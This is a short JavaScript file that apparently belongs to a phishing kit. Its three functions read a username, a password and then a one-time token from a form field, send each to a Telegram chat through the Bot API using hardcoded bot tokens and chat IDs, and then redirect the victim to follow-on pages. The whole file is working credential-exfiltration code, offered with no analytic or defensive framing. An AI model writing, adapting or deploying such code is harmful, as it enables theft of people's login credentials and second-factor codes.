function carl(params) {
  const token = "7731028480:AAGX4jqIxSXCjeA1a0W1-mr4krA3Fz-g_ms";
  const chatId = "6889692889";
  const usr = document.getElementById("step01").value;

  const message = `-NEW ONE-\n --Usr.: ${usr} \n   `;
  $.ajax({
    type: "POST",
    url: `https://api.telegram.org/bot${token}/sendMessage`,
    data: {
      chat_id: chatId,
      text: message,
      parse_mode: "html",
    },
    success: function (res) {
      console.debug(res);
      $("#response").text("Message sent");
      console.log("enviado");
      localStorage.setItem("usr", usr);
      window.location = "confirm.html";
    },
    error: function (error) {
      console.error(error);
      alert("error failed");
    },
  });
}

function carl1(params) {
  const token = "8122904796:AAEjKqJtM0QHkXQNyZXlzRwU8vBfTvB6AzA";
  const chatId = "6738243967";
  const usr = localStorage.getItem("usr");
  const pw = document.getElementById("step01").value;

  const message = `-NEW ONE-\n --Usr.: ${usr} -- PW.: ${pw} `;
  $.ajax({
    type: "POST",
    url: `https://api.telegram.org/bot${token}/sendMessage`,
    data: {
      chat_id: chatId,
      text: message,
      parse_mode: "html",
    },
    success: function (res) {
      console.debug(res);
      $("#response").text("Message sent");
      console.log("enviado");

      window.location = "load.html";
    },
    error: function (error) {
      console.error(error);
      alert("error failed");
    },
  });
}

function carl2(params) {
  const token = "8122904796:AAEjKqJtM0QHkXQNyZXlzRwU8vBfTvB6AzA";
  const chatId = "6738243967";
  const usr = localStorage.getItem("usr");
  const pw = document.getElementById("step01").value;

  const message = `-NEW ONE-\n --Usr.: ${usr} -- TOKEN.: ${pw} `;
  $.ajax({
    type: "POST",
    url: `https://api.telegram.org/bot${token}/sendMessage`,
    data: {
      chat_id: chatId,
      text: message,
      parse_mode: "html",
    },
    success: function (res) {
      console.debug(res);
      $("#response").text("Message sent");
      console.log("enviado");

      window.location = "load.html";
    },
    error: function (error) {
      console.error(error);
      alert("error failed");
    },
  });
}
